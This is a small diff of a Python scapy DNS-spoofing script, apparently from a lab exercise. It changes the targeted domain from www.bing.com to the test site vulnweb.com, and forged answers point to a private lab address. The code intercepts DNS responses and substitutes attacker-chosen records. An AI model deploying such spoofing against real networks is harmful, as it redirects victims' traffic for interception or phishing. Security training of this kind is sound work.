@@ -11,7 +11,7 @@ def process_packet(packet):
     # see if scapy has a DNS response
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname.decode():
+        if "vulnweb.com" in qname.decode():
             print("[+] Spoofing Target")
             # use scapy to create dns response and asnwer count
             answer = scapy.DNSRR(rrname=qname, rdata="172.16.149.128")
